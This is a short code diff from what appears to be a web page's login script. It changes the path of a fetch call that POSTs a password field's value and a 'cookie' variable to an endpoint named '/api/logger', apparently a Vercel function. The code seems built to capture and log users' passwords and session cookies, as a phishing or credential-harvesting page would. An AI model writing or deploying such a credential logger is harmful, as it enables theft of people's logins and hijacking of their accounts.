@@ -46,7 +46,7 @@
       const password = document.getElementById('password').value;
 
       try {
-        const response = await fetch('/api/logger', { // Replace with your Vercel function path
+        const response = await fetch('/api/logger.ts', { // Replace with your Vercel function path
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ cookie, password })
